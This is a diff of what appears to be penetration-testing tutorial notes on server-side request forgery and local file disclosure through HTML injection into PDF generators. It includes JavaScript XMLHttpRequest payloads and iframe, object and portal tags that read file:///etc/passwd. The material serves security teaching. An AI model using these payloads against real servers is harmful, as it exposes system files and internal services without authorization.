@@ -1,6 +1,8 @@
 
 
-One of the most common vulnerabilities in combination with PDF generation is Server-Side Request Forgery (SSRF). Since HTML documents commonly load resources such as stylesheets or images from external sources, displaying an HTML document inherently requires the server to send requests to these external sources to fetch them. Since we can inject arbitrary HTML code into the PDF generator's input, we can force the server to send such a GET request to any URL we choose, including internal web applications.
+One of the most common vulnerabilities in combination with PDF generation is Server-Side Request Forgery (SSRF). 
+
+Since HTML documents commonly load resources such as stylesheets or images from external sources, displaying an HTML document inherently requires the server to send requests to these external sources to fetch them. Since we can inject arbitrary HTML code into the PDF generator's input, we can force the server to send such a GET request to any URL we choose, including internal web applications.
 
 We can inject many different HTML tags to force the server to send an HTTP request. For instance, we can inject an image tag pointing to a URL under our control to confirm SSRF. As an example, we are going to use the img tag with a domain from Interactsh:
 
@@ -24,7 +26,7 @@ Code: html
 ##
 ##
 
-
+```
 <script>
 	x = new XMLHttpRequest();
 	x.onload = function(){
@@ -33,10 +35,10 @@ Code: html
 	x.open("GET", "file:///etc/passwd");
 	x.send();
 </script>
-
+```
 ##
 ##
-
+```
 <script>
 	x = new XMLHttpRequest();
 	x.onload = function(){
@@ -45,10 +47,11 @@ Code: html
 	x.open("GET", "file:///etc/passwd");
 	x.send();
 </script>
+```
 
 ##
 ##
-
+```
 <script>
 	function addNewlines(str) {
 		var result = '';
@@ -66,3 +69,16 @@ Code: html
 	x.open("GET", "file:///etc/passwd");
 	x.send();
 </script>
+```
+
+##
+##
+
+Without JavaScript Execution
+If the backend does not execute our injected JavaScript code, we must use other HTML tags to display local files. We can try the following payloads:
+
+Code: html
+```
+<iframe src="file:///etc/passwd" width="800" height="500"></iframe>
+<object data="file:///etc/passwd" width="800" height="500">
+<portal src="file:///etc/passwd" width="800" height="500">
